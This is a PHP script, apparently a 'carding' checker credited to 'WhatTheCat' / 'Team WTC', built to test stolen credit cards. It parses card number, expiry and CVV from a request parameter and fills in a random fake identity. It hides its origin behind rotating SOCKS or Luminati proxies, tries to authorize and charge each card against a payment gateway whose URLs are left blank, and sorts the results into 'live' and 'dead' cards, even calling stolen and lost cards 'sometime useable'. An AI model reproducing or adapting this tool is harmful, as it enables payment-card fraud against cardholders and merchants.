<?php

///////////////////////////////////WhatTheCat Inc.

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Bangkok');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function monarchproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = monarchproxys();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
$bin = 'Credit';
}else {
$bin = 'Debit';
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////===[Luminati Details]

$username = 'Put Zone Username Here';
$password = 'Put Zone Password Here';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
/////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, '');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: ', 
'accept-language: ',
'accept-encoding: ',
'content-type: ',
'origin: ',
'referer: ',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
));  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '');

$result = curl_exec($ch);
$token = trim(strip_tags(getStr($result,'"id": "','"')));

////////////////////////////===[For Charging Cards]-[2 req]

$ch = curl_init();
/////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// ////////=========Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, '');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: ',
'accept-encoding: ',
'accept-language: ',
'content-type: ',
'cookie: ', 
'Origin: ',
'referer: ',
'Sec-Fetch-Mode: cors',
 ));
$id = curl_exec($ch); 
 curl_setopt($ch, CURLOPT_POSTFIELDS, '');

$result = curl_exec($ch);
$message = trim(strip_tags(getStr($result,'"message":"','"'))); 

////////////////////////////===[Card Response]

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved CVV </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="green"> <font class="badge badge-success">CVC MATCHED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved CVV </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="green"> <font class="badge badge-success">CVC MATCHED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved CVV </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="green"> <font class="badge badge-success">CVC MATCHED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<font size=3.5 color="white"><font class="badge badge-success">#Approve CCN </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="green"> <font class="badge badge-success">CCN LIVE</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
  echo '<font size=3.5 color="white"><font class="badge badge-success">#Approve CCN </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="green"> <font class="badge badge-success">CCN LIVE</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
  echo '<font size=3.5 color="white"><font class="badge badge-success">#Approve CCN </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="green"> <font class="badge badge-success">CCN LIVE</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<font size=3.5 color="white"><font class="badge badge-success">#Approve CCN </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="green"> <font class="badge badge-success">CCN LIVE</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved CVV </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="green"> <font class="badge badge-success">CVC MATCHED - Incorrect ZIP</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<font size=3.5 color="white"><font class="badge badge-success">#Approve CCN </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="green"> <font class="badge badge-warning">Stolen Card : Sometime Useable</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<font size=3.5 color="white"><font class="badge badge-success">#Approve CCN </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="green"> <font class="badge badge-warning">Lost Card : Sometime Useable</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<font size=3.5 color="white"><font class="badge badge-success">#Approve CCN </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="green"> <font class="badge badge-warning">Insufficient Funds</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-danger">Card Expired</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<font size=3.5 color="white"><font class="badge badge-danger">#Approve CCN </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="green"> <font class="badge badge-warning">Pickup Card_Card</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-danger">Incorrect Card Number</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-danger">Incorrect Card Number</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-danger">Card Declined</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-danger">Declined : Generic_Decline</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-danger">Declined : Do_Not_Honor</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-danger">Security Code Check : Unchecked</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-danger">Security Code Check : Fail</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-danger">Expired Card</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-danger">Card Doesnt Support This Purchase</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}
 else {
  echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-danger">Gate Closed</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">[Ƭєαм ƜƬƇ]</font><br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
echo $result 
///////////////////////////////////////////////======Edited By WhatTheCat===============\\\\\\\\\\\\\\\
?>